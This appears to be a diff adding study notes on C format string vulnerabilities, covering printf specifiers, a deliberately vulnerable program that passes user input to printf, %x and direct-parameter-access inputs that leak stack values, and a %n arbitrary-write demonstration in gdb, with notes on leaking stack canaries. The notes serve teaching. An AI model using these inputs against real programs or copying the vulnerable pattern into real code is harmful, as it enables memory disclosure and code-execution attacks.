@@ -1,0 +1,101 @@
+- Concept
+    - C language preview (printf,...)
+        - Consider the following
+            #include <stdio.h>
+
+            int main()
+            {
+                int a = -5;
+                float b = 5.5;
+                char *c = "My String";
+
+                printf("A = %d, B = %f, C = %s \n", a, b, c);
+                // A = -5, B = 5.5, C = My String
+
+                printf("A = %u, B = %f, C = %s \n", a, b, c);
+                // A = 4294967291, B = 5.5, C = My String
+                
+                printf("A = %20u \n", a);
+                // A =                     4294967291
+            }
+            - %u : stands for the unsigned integer
+            - %20u : this will add some kind of padding so that the 
+                    argument get displyed after certain space.
+                    - The value 20 will insert 20 bytes
+    - Vulnerable program
+        - Consider the following vulnerable program
+            // fmt.c
+            #include <stdio.h>
+            #include <string.h>
+
+            int main(int argc, char *argv[])
+            {
+                char b [128];
+                strpy(b, argv[1]);
+                printf(b);
+                printf("\n");
+            }
+
+            - Run this program
+                $ ./fmt AAAA
+                AAAA
+                $ ./fmt AAAABBBB
+                AAAABBBB
+                - This is the normal execution of the program.
+            - What if we do the following
+                $ ./fmt AAAABBBB-%x-%x-%x-%x
+                AAAABBBB-bfff4f9-1-b7eb8f62-41414141
+                - %x : means print the next value of the stack as 
+                hexadecimal value.
+                - What if we add one more "%x"
+                    $ ./fmt AAAABBBB-%x-%x-%x-%x-%x
+                    AAAABBBB-bfff4f9-1-b7eb8f62-41414141-42424242
+                
+                $ ./fmt AAAABBBB-%4\$x
+                AAAABBBB-41414141
+                $ ./fmt AAAABBBB-%4\$x-%5\$x
+                AAAABBBB-41414141-42424242
+                - %4\$x : This will go directly 4 steps and 
+                print the next value
+                    - We needed to add backslash before the dollar sign
+                    inorder to escape it since its the meta character
+                    - This is a way for accessing value directly without
+                    having to go through each of the preceding vallues and
+                    this is called direct parameter access.
+        - The fact that we can control the form of string basically
+        means that printf 
+            - Goes further down the stack that it wasn't suppose to go 
+            - And read the content of thes stack.
+        - By itself this is information leaking
+        - If we have format string vulnerablity we can use it leak
+        a cannary value that is used as a protection mechanism against
+        buffer overflow, 
+            - Then we can use it to build our attack string dynamically
+            so that we can repair the cannary and use it to buffer 
+            overflow
+
+- Perform arbitrary write
+    - n : number of characters written so far stored into the 
+        integer indicated by int * (or variant) pointer 
+        argument.
+        - writes the number of characters stored
+    - Perform the following on fmt.c 
+        $ gdb -q fmt
+        (gdb) ./fmt AAAA-%4\$n 
+        Segmentation fault 
+        - Let us examine it
+
+        (gdb) x/i $eip
+        => 0xb75f0463 .... ... : mov %edx, (%eax)
+        (gdb) p/x $edx
+        $1 = 0x5
+        (gdb) p/x $eax
+        $2 = 0x41414141
+        - From the above examination what we learn is that
+            - The program is trying to write 5 to 
+            non-existing address 0x41414141 
+            - But why 5? 
+                - Thats because the number of characters before
+                % are 5 i.e 'AAAA-'
+
+- Writing on dynamic relocation and redirection to shellcode
